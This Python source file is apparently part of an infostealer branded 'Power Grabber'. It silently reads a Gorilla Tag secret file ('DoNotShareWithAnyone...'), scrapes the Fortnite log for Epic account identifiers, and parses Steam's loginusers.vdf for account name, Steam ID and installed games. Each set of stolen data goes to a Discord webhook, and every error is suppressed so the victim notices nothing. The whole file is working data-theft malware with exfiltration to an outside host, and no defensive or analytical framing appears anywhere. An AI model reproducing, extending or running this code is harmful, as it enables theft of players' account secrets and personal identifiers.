import os
import re
import requests
import datetime
import json
file_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'LocalLow', 'Another Axiom', 'Gorilla Tag', 'DoNotShareWithAnyoneEVERNoMatterWhatTheySay.txt')
app_data_path = os.getenv('APPDATA')
log_file_path = os.path.join(app_data_path, r"..\Local\FortniteGame\Saved\Logs\FortniteGame.log")
account_name = None
def find_user_info(log_file_path):
    global account_name
    try:
        with open(log_file_path, 'r', encoding='utf-8') as file:
            for line in file:
                match = re.search(r'UserId=\[([^\]]+)\].*DisplayName=\[([^\]]+)\].*EpicAccountId=\[([^\]]+)\]', line)
                if match:
                    user_id = match.group(1)
                    display_name = match.group(2)
                    epic_account_id = match.group(3)
                    account_name = display_name
                    return user_id, display_name, epic_account_id
        return None, None, None
    except FileNotFoundError:
        pass
        return None, None, None
def send_to_discord(display_name, user_id, epic_account_id, image_url):
    embed = {
        "embeds": [
            {
                "title": f"**{display_name}'s Fornite info:**",
                "color": 0x8b0000,
                "thumbnail": {
                    "url": image_url
                },
                "fields": [
                    {
                        "name": "👤Epic Account name:",
                        "value": display_name,
                        "inline": True
                    },
                    {
                        "name": "User ID:",
                        "value": user_id,
                        "inline": True
                    },
                    {
                        "name": "Epic Account ID:",
                        "value": epic_account_id,
                        "inline": True
                    },
                    {
                        "name": "Fortnite Tracker URL:",
                        "value": f"https://fortnitetracker.com/profile/all/{display_name}",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe",
                    "icon_url": image_url
                }
            }
        ]
    }
    response = requests.post(webhook_url, json=embed)
    if response.status_code == 204:
        pass
    else:
        pass
user_id, display_name, epic_account_id = find_user_info(log_file_path)
img = {
    'image_url': 'https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true'
}
image_url = img['image_url']
if user_id and display_name and epic_account_id:
    send_to_discord(display_name, user_id, epic_account_id, image_url)
else:
    pass
STEAM_DEFAULT_PATHS = [
    "C:\\Program Files (x86)\\Steam",
    "C:\\Program Files\\Steam",
    os.path.expanduser("~\\AppData\\Local\\Steam")
]
SYSTEM_GAME_NAMES = {
    "Steamworks Common Redistributables",
    "SteamVR",
    "Steam Client",
    "Source SDK",
    "Steam Runtime"
}
def is_steam_installed():
    for path in STEAM_DEFAULT_PATHS:
        steam_exe_path = os.path.join(path, "steam.exe")
        if os.path.exists(steam_exe_path):
            return path
    return None
def get_account_name_and_steam_id_from_vdf(vdf_path):
    global account_name
    try:
        with open(vdf_path, "r", encoding="utf-8") as file:
            data = file.read()
            account_name_match = re.search(r'"AccountName"\s+"(.*?)"', data)
            steam_id_match = re.search(r'"(\d{17})"', data)
            account_name = account_name_match.group(1) if account_name_match else None
            steam_id = steam_id_match.group(1) if steam_id_match else None
            return account_name, steam_id
    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    return None, None
def get_library_folders(steam_install_path):
    libraryfolders_path = os.path.join(steam_install_path, "steamapps", "libraryfolders.vdf")
    library_folders = [steam_install_path]
    if os.path.exists(libraryfolders_path):
        with open(libraryfolders_path, "r", encoding="utf-8") as file:
            data = file.read()
            additional_folders = re.findall(r'"path"\s+"(.*?)"', data)
            library_folders.extend(additional_folders)
    return library_folders
def parse_acf_file(file_path):
    with open(file_path, "r", encoding="utf-8") as file:
        for line in file:
            if '"name"' in line:
                return line.split('"')[3]
    return None
def get_installed_steam_games(steam_install_path):
    installed_games = []
    library_folders = get_library_folders(steam_install_path)
    for library in library_folders:
        steamapps_path = os.path.join(library, "steamapps")
        if os.path.exists(steamapps_path):
            for item in os.listdir(steamapps_path):
                if item.endswith(".acf"):
                    acf_path = os.path.join(steamapps_path, item)
                    game_name = parse_acf_file(acf_path)
                    if game_name and game_name not in SYSTEM_GAME_NAMES:
                        installed_games.append(game_name)
    return installed_games
def send_webhook(account_name, games, steam_id, image_url):
    games_url = f"https://steamcommunity.com/id/{steam_id}/games"
    wishlist_url = f"https://steamcommunity.com/id/{steam_id}/wishlist"
    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    embed = {
        "embeds": [
            {
                "title": f"🎮 Steam Account Info for **{account_name}**",
                "description": (
                    "Here is some steam info for this user."
                ),
                "color": 0x8b0000,
                "thumbnail": {
                    "url": image_url
                },
                "fields": [
                    {
                        "name": "👤 **Steam Account Name**",
                        "value": f"**{account_name}**",
                        "inline": True
                    },
                    {
                        "name": "🎮 **Number of Games**",
                        "value": f"{len(games)} games installed",
                        "inline": True
                    },
                    {
                        "name": "🕹️ **Installed Games**",
                        "value": "\n".join(games) if games else "No games installed.",
                        "inline": False
                    },
                    {
                        "name": "💿 **User's Game Library:**",
                        "value": f"[Click Me]({games_url})",
                        "inline": False
                    },
                    {
                        "name": "🌠 **User's Wishlist:**",
                        "value": f"[Click Me]({wishlist_url})",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                    "icon_url": image_url
                },
                "timestamp": timestamp
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=embed)
        if response.status_code == 204:
            pass
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass
def main():
    steam_install_path = is_steam_installed()
    if steam_install_path:
        config_path = os.path.join(steam_install_path, "config")
        vdf_path = os.path.join(config_path, "loginusers.vdf")
        account_name, steam_id = get_account_name_and_steam_id_from_vdf(vdf_path)
        if account_name and steam_id:
            games = get_installed_steam_games(steam_install_path)
            send_webhook(account_name, games, steam_id, image_url)
        else:
            pass
    else:
        pass
if __name__ == "__main__":
    main()
try:
    with open(file_path, 'r') as file:
            contents = file.read()
    embed = {
            "avatar_url": image_url,
            "embeds": [{
                "title": f"**{account_name}'s Gorilla Tag ID**",
                "description": contents,
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                "thumbnail": {
                    "url": image_url
                },
                "footer": {
                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                    "icon_url": image_url
                },
                "color": 0x8b0000,
            }]
        }
    response = requests.post(webhook_url, data=json.dumps(embed), headers={"Content-Type": "application/json"})
    if response.status_code == 204:
        pass
    else:
        pass
except FileNotFoundError:
    pass
except Exception as e:
    pass
